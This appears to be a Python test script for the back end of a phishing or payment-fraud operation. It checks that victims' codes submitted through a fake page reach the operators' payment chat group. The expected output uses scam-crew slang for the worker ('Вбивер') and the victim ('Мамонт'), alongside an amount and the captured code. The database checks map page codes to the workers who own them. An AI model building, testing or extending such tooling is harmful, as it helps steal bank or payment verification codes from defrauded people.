#!/usr/bin/env python3
"""
Тестовий скрипт для перевірки передачі page_code в code_notify
"""

import requests
import json
import time

def test_page_code_transfer():
    """Тестує передачу page_code в code_notify"""
    print("🧪 Тестування передачі page_code в code_notify...")
    
    # Тест 1: З page_code
    print("\n1. Тест з page_code...")
    try:
        data = {
            'page_code': 'test-page-123',
            'ip': '127.0.0.1',
            'code': 'ABC123'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Повідомлення надіслано успішно")
            print("   📱 Перевірте, чи з'явилося повідомлення в PAYMENT_GROUP_ID")
            print("   🔍 Має бути: Вбивер: @user_XXX, Ссылка: ?page=test-page-123, Код: ABC123")
        else:
            print("   ❌ Помилка надсилання повідомлення")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    time.sleep(2)
    
    # Тест 2: Через /send_code endpoint (як фронтенд)
    print("\n2. Тест через /send_code endpoint...")
    try:
        data = {
            'page': 'test-page-456',  # Фронтенд передає 'page'
            'ip': '127.0.0.2',
            'code': 'XYZ789'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано через /send_code успішно")
            print("   📱 Перевірте, чи з'явилося повідомлення в PAYMENT_GROUP_ID")
            print("   🔍 Має бути: Вбивер: @user_XXX, Ссылка: ?page=test-page-456, Код: XYZ789")
        else:
            print("   ❌ Помилка надсилання коду")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    time.sleep(2)
    
    # Тест 3: Без page_code
    print("\n3. Тест без page_code...")
    try:
        data = {
            'ip': '127.0.0.3',
            'code': 'NO_PAGE'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Повідомлення надіслано без page_code")
            print("   📱 Перевірте, чи з'явилося повідомлення в PAYMENT_GROUP_ID")
            print("   🔍 Має бути: Вбивер: @Не указано, Ссылка: ?page=Не указано, Код: NO_PAGE")
        else:
            print("   ❌ Помилка надсилання повідомлення")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_database_connection():
    """Тестує підключення до бази даних"""
    print("\n🧪 Тестування підключення до бази даних...")
    
    try:
        import sqlite3
        
        # Підключаємося до бази даних
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        
        # Перевіряємо таблицю event_links
        print("\n📊 Таблиця event_links:")
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='event_links'")
        if cursor.fetchone():
            cursor.execute("SELECT event_code, user_id FROM event_links LIMIT 5")
            rows = cursor.fetchall()
            for row in rows:
                print(f"   event_code: {row[0]}, user_id: {row[1]}")
        else:
            print("   ❌ Таблиця event_links не існує")
        
        # Перевіряємо таблицю users
        print("\n📊 Таблиця users:")
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users'")
        if cursor.fetchone():
            cursor.execute("SELECT user_id, username FROM users LIMIT 5")
            rows = cursor.fetchall()
            for row in rows:
                print(f"   user_id: {row[0]}, username: {row[1]}")
        else:
            print("   ❌ Таблиця users не існує")
        
        conn.close()
        print("   ✅ Підключення до бази даних успішне")
        
    except Exception as e:
        print(f"   ❌ Помилка підключення до бази даних: {e}")

if __name__ == "__main__":
    print("🚀 Запуск тестування передачі page_code...")
    print("⚠️  Переконайтеся, що сервер запущений на порту 8080 та бот на порту 8081!")
    print("=" * 60)
    
    test_database_connection()
    test_page_code_transfer()
    
    print("\n" + "=" * 60)
    print("✅ Тестування завершено!")
    print("\n📋 Що перевірити:")
    print("1. Чи правильно передається page_code")
    print("2. Чи правильно знаходиться username власника")
    print("3. Чи правильно відображається посилання")
    print("4. Чи правильно відображається код користувача")
    print("5. Чи правильно працює конвертація 'page' -> 'page_code'")
    
    print("\n🔧 Очікуваний результат:")
    print("🔔 Отправлен запрос на код")
    print("🧑‍🏭 Вбивер: @user_123")
    print("🐘 Мамонт: User_1")
    print("💰 Сума: 45 EUR")
    print("#️⃣ Ссылка: ?page=test-page-123")
    print("🔐 Код: ABC123")
